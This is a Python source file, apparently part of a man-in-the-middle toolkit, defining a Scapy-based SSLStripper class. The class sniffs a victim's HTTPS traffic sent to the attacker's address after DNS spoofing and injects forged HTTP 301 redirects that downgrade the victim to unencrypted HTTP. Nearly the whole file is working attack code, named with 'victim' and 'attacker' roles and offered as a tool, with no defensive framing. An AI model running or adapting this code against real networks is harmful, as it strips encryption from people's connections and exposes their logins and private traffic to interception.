from scapy.all import *
from scapy.layers.inet import IP
from logger import log_info, log_warning
from scapy.layers.http import HTTPRequest, TCP, Raw

class SSLStripper:
    def __init__(self, interface, ip_victim, ip_attacker):
        self.interface = interface
        self.ip_victim = ip_victim
        self.ip_attacker = ip_attacker

    def strip(self):
        log_info("Starting SSL stripping")
        sniff(
            filter="tcp and port 443",
            prn=self._on_https_request,
            iface=self.interface,
            count=0,
        )
        log_warning("Stopping SSL stripping")

    def _on_https_request(self, packet):
        # TODO: move these checks into sniff filter (also for DNS)
        if (
            # Ideally we would want to check that this is an HTTPS packet, but it is encrypted
            packet[IP].src == self.ip_victim
            # Because we did the DNS spoofing, we should only strip if the destination IP is us (as in only then it is intended for the server)
            and packet[IP].dst == self.ip_attacker
        ):
            log_info(
                "Received HTTPS request for {} from {}".format(
                    packet[IP].dst, packet[IP].src
                )
            )
            # Construct the HTTP response
            response = (
                IP(dst=packet[IP].src, src=packet[IP].dst)
                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="PA")
                / Raw(load="HTTP/1.1 301 Moved Permanently\nLocation: http://{}".format(packet[IP].dst))
            )

            send(response, verbose=0)
            log_info("Sent HTTP response for {} to {}".format(packet[IP].src, packet[IP].dst))
        else:
            log_warning("Ignoring packet from {}".format(packet[IP].src))